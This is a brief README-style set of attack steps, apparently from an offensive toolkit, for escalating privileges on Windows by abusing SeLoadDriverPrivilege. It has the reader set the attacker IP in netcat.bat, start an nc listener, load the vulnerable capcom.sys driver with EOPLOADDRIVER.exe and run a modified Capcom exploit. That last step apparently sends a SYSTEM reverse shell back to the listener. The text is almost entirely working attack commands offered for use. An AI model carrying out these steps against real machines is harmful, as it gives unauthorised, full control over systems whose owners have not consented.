# SeLoadDriverPrivilege

1. Edit netcat.bat to add your IP
2. Upload all the files on the Target Machine
3. Start netcat listener
   `rlwrap -cAr nc -lvnp 2222`
4. Run these commands
   `.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys`
   `.\ExploitCapcom_modded.exe`
